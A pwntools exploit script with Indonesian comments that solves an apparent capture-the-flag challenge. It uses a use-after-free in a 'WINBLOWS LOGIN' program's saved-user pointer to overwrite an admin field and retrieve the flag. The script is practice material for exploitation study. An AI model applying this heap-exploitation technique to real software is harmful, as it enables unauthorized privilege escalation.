from pwn import *

p = remote("thekidofarcrania.com", 13226)

# Set dulu username
log.info("Setting Username...")
p.recvuntil("WINBLOWS LOGIN")
p.sendline("1")
p.recvuntil("Username:")
p.sendline("A" * 31)

# Kemudian Lock User agar tersimpan pada pointer save (void*)save
log.info("Lock User to pointer save")
p.recvuntil("WINBLOWS LOGIN")
p.sendline("4")

# Kemudian Logout agar mengclean address dari (void*)curr
log.info("Cleaning pointer curr (free)")
p.recvuntil("WINBLOWS LOGIN")
p.sendline("2")

# Kemudian ambil kembali pointer dari (void*)save untuk (void*)curr
# Disini lah letak celahnya, pointer save tidak melakukan memcpy alias hanya melakukan operator =
log.info("Retrieve pointer save to curr (without memcpy)")
p.recvuntil("WINBLOWS LOGIN")
p.sendline("5")

# Heap pada struktur creds
log.info("Heap memory with 42 byte (Name = 32 Byte)")
p.recvuntil("WINBLOWS LOGIN")
p.sendline("3")
p.recvuntil("flag instead?")
p.sendline("A" * 42) # Membuat admin menjadi 0x42424242

# Mengprint-flag aslinya
log.info("Printing flag")
p.recvuntil("WINBLOWS LOGIN")
p.sendline("3")
res = p.recvuntil("Here's your flag:\n")
res = p.recvline()

log.success("Flag : " + res)
p.close()